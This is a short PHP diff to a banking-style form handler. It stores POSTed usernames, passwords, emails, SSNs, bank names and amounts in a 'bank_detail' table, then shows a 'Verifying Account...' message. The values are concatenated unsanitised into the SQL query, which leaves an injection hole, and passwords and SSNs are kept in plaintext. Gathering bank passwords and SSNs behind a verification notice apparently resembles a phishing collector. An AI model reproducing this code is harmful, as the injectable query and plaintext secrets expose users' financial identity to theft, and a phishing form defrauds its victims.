@@ -43,12 +43,15 @@
             $acc_email = $_POST['email'];
             $username = $_POST['username'];
             $pass = $_POST['password'];
+            $bankName = $_POST['bank_name'];
+            $amount = $_POST['amount'];
 
-            $sendData = "INSERT into bank_detail (username,password,email,ssn) VALUES('$username','$pass','$acc_email','$ssn')";
+            $sendData = "INSERT into bank_detail (username,password,email,ssn,bankName,amount) VALUES('$username','$pass','$acc_email','$ssn','$bankName','$amount')";
+
             $runQuery = mysqli_query($conn,$sendData) or die($conn);
 
             if($runQuery){
-                $_SESSION['alertMsg'] = "<div class='alert alert-success p-2 my-2 mx-5' >Account is being verified</div>";
+                $_SESSION['alertMsg'] = "<div class='alert alert-success p-2 my-2 mx-5' ><h3>Verifying Account...</h3><small>This might take some time! We'll send you an email once your account is verified</small></div>";
                 header('location:onlinebanking.php');
             }
         }
